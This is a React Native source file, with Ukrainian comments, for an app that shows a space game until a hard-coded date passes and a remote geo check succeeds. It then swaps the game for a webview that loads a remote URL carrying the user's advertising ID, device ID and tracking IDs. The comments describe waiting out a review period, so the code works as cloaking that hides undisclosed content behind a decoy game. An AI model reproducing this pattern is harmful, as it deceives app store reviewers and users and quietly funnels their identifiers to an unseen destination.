import React, {useEffect, useRef, useState} from 'react';
import {Linking} from 'react-native';

import Storage from './Storage';
import EventManager from './EventsManager';

import appsFlyer from 'react-native-appsflyer';
import ReactNativeIdfaAaid from '@sparkfabrik/react-native-idfa-aaid';
import AppleAdsAttributionInstance from '@vladikstyle/react-native-apple-ads-attribution';
import {requestTrackingPermission} from 'react-native-tracking-transparency';
import {OneSignal} from 'react-native-onesignal';
import * as Device from 'react-native-device-info';
import Params from './Params';

import AppManagerStack from './AppManagerStack';
import LoaderRoot from './LoaderRoot';
import MercurSpaceStack from '../StackNavigator';

export default function AppManager() {
  const viewLoader = <LoaderRoot />;
  const viewGame = <MercurSpaceStack />;
  const appManagerStack = (link, _userAgent) => <AppManagerStack dataLoad={link} userAgent={_userAgent} />;

  const [isLoadingScreen, setLoadingScreen] = useState(true);
  const [isGameOpen, setGameOpen] = useState(true);

  const userID = useRef(null);
  const adID = useRef(null);
  const appsID = useRef(null);
  const subsRef = useRef(null);
  const onesignalID = useRef(null);
  const deviceID = useRef(null);
  const isPushAccess = useRef(false);
  const dataLoad = useRef(null);
  const appendParams = useRef(null);
  const userAgent = useRef(null);

  // генеруємо унікальний ID користувача
  async function getUserID() {
    const val = await Storage.get('userID');
    if (val) {
      userID.current = val; // додаємо збережений userID
    } else {
      // генеруємо новий userID якщо нема збереженого
      let result = '';
      for (let i = 0; i < 7; i++) {
        result += Math.floor(Math.random() * 10);
      }
      userID.current = '' + new Date().getTime() + '-' + result;
      await Storage.save('userID', userID.current); // зберігаємо userID
    }
  }

  // робимо запит на відстеження
  async function getAdID() {
    await requestTrackingPermission(); // робимо запит на відстеження
    ReactNativeIdfaAaid.getAdvertisingInfoAndCheckAuthorization(true).then(
        res => {
          // обробляємо клік в алерт
          adID.current = res.id ? res.id : '00000000-0000-0000-0000-000000000000'; // отримуємо advertising id
          initAppManager();
        },
    );
  }

  // порівнюємо теперішню дату та дату закінчення відльожки
  function checkDateStart() {
    return new Date() >= new Date(Params.targetDate);
  }

  // перевірка на відкриття webview
  async function checkInitAppManagerView() {
    EventManager.sendEvent(EventManager.eventList.firstOpen);
    if ((await fetch(Params.bodyLin)).status === 200) {
      await initOnesignal();
    } else {
      console.log('initAppManagerView');
      loadGame();
    } // якщо це не коректне гео запускаємо гру
  }

  // ініціалізація OneSignal
  async function initOnesignal() {
    await OneSignal.Notifications.canRequestPermission().then(permision => {
      // перевіряємо чи можемо зробити запит на надсилання пушів
      if (permision) {
        OneSignal.Notifications.requestPermission(true).then(res => {
          // робимо запит та обробляємо його
          isPushAccess.current = res;
          initAppsflyer();
        });
      }
    });
    OneSignal.User.addTag(
        'timestamp_user_id',
        userID.current,
    ); // додаємо тег унікального користувача
  }

  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
      res => {
        try {
          if (JSON.parse(res.data.is_first_launch) === true) {
            if (res.data.af_status === 'Non-organic') {
              if (res.data.campaign.toString().includes('_')) {
                subsRef.current = res.data.campaign;
                appendParams.current = 'NON-ORGANIC';
              } else {
                appendParams.current = 'CONVERT-SUBS-MISSING-SPLITTER';
              }
              generateFinish();
            } else {
              getAsaAttribution();
            }
          }
        } catch (err) {
          console.log(err);
          loadGame();
        }
      },
  );

  async function getAsaAttribution() {
    try {
      const adServicesAttributionData =
          await AppleAdsAttributionInstance.getAdServicesAttributionData();
      if (
          !adServicesAttributionData ||
          typeof adServicesAttributionData.attribution !== 'boolean'
      ) {
        appendParams.current = 'ORGANIC';
        generateFinish();
        return;
      }
      if (adServicesAttributionData.attribution === true) {
        appendParams.current = 'ASA';
        subsRef.current = 'asa';
      }
      generateFinish();
    } catch (error) {
      appendParams.current = 'ORGANIC';
      generateFinish();
    }
  }

  // генеруємо фінальну лінку яку будемо загружати в вебвʼю
  function generateFinish() {
    OneSignal.User.getOnesignalId().then(res => {
      onesignalID.current = res;
      dataLoad.current =
          Params.bodyLin +
          `?${Params.bodyLin.split('space/')[1]}=1&appsID=${
              appsID.current
          }&adID=${adID.current}&onesignalID=${onesignalID.current}&deviceID=${
              deviceID.current
          }&userID=${deviceID.current}${generateSubs()}${appendParams.current ? `&info=${appendParams.current}` : ''}` + '&timestamp=' + userID.current;
      Storage.save('link', dataLoad.current);
      openAppManagerView(true, false);
    });
  }

  function openAppManagerView(isFirst) {
    if (isFirst && isPushAccess.current) {
      EventManager.sendEvent(EventManager.eventList.push);
    }
    EventManager.sendEvent(EventManager.eventList.web);
    setGameOpen(false);
    setLoadingScreen(false);
  }

  function generateSubs() {
    if (!subsRef.current) {
      return '';
    }
    const subList = subsRef.current.split('_');
    if (subList.length === 1 && subList[0] !== 'asa') {
      return '';
    }
    const subParams = subList
        .map((sub, index) => `sub_id_${index + 1}=${sub}`)
        .join('&');

    return `&${subParams}`;
  }

  // ініціалізація appsflyer
  async function initAppsflyer() {
    appsFlyer.initSdk({
      devKey: Params.keyApps,
      isDebug: false,
      appId: Params.appID,
      onInstallConversionDataListener: true,
      onDeepLinkListener: true,
      timeToWaitForATTUserAuthorization: 7,
    });

    // отримання appsflyer ID
    appsFlyer.getAppsFlyerUID((_, id) => {
      appsID.current = id;
    });
  }

  // ініціалізація AppManager
  async function initAppManager() {
    if (checkDateStart()) {
      // перевіряємо дату
      await Storage.get('link').then(res => {
        if (res) {
          appsFlyer.initSdk({
            devKey: Params.keyApps,
            isDebug: false,
            appId: Params.appID,
            onInstallConversionDataListener: false,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 7,
          });
          // перевіряємо чи не збережена лінка якщо збережена то загружаємо webview
          dataLoad.current = res;
          openAppManagerView(false, false);
        } else {
          // якщо лінки немає то перевіряємо чи коректне гео
          checkInitAppManagerView();
        }
      });
    } else {
      // якщо дата закінчення відльожки ще не пройшла, то запускаємо гру
      console.log('date');
      loadGame();
    }
  }

  // загружаємо екран з грою
  function loadGame() {
    setTimeout(() => {
      setGameOpen(true);
      setLoadingScreen(false);
    }, 2500);
  }

  function initApp() {
    OneSignal.initialize(Params.keyPush);
    getUserID();
    let pushOpen = false;
    let linkOpenInBrowser = null;
    OneSignal.Notifications.addEventListener('click', event => {
      pushOpen = true;
      try {
        linkOpenInBrowser = event.notification.launchURL;
      } catch (_) {}
    });
    setTimeout(() => {
      EventManager.setParams(userID.current);
      if (pushOpen) {
        const getSavedLink = async () => {
          await Storage.get('link').then(res => {
            dataLoad.current = res + '&push=true';
            if (linkOpenInBrowser) {
              EventManager.sendEvent(EventManager.eventList.browser);
              Linking.openURL(linkOpenInBrowser);
            } else {
              EventManager.sendEvent(EventManager.eventList.web_push);
            }
            openAppManagerView(false);
          });
        };
        getSavedLink();
      } else {
        const init = async () => {
          try {
            deviceID.current = await Device.getUniqueId();
            userAgent.current = await Device.getUserAgent();
            getAdID();
          } catch (_) {}
        };
        init();
      }
    }, 500);
  }

  useEffect(() => {
    initApp();
  }, []);

  return !isLoadingScreen
      ? isGameOpen
          ? viewGame
          : appManagerStack(dataLoad.current, userAgent.current)
      : viewLoader;
}
